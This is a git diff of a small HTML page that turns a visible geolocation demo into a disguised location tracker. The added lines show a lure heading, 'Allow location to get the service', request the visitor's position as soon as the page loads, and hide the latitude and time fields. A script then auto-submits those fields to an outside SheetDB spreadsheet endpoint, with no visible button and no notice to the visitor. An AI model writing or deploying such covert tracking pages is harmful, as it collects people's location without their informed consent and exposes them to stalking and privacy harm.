@@ -1,29 +1,26 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <h1>Allow location to get the service</h1>
+<p id=p_id></p>
 
-<p>Click the button to get your coordinates.</p>
-
-<button onclick="getLocation()" id="getloc">Try It</button>
-
-<p id="demo"></p>
 
 <script>
-  get_loc=document.getElementById("getloc");
-  get_loc.click();
-var x = document.getElementById("demo");
+  para=document.getElementById("p_id")
+ getLocation();
 
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
+    para.innerHTML="Success";
   } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
+    console.log("Geolocation is not supported by this browser.");
+     para.innerHTML="try the link on better browser like Chrome";
   }
 }
 
 function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
+  
 
 var today = new Date();
 var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
@@ -49,6 +46,7 @@ SubForm();
         data:$("#myForm").serializeArray(),
         success: function(){
           console.log("Form Data Submitted :)")
+
         },
         error: function(){
           console.log("There was an error :(")
@@ -69,10 +67,10 @@ SubForm();
 
 
 <form name="f_name" id="myForm" action="https://sheetdb.io/api/v1/tzligcj8zu6x4" method="POST" id="sheetdb-form">
-  time: <input name="time_stamp" id="time_stamp">
-  Name: <input name="Latitude" id="lat" value="nothing">
+   <input type="hidden" name="time_stamp" id="time_stamp">
+  <input type="hidden" name="Latitude" id="lat" value="nothing">
   
-  <button id="btn" onclick=SubForm()>Submit</button>
+ 
 
 </form>
 
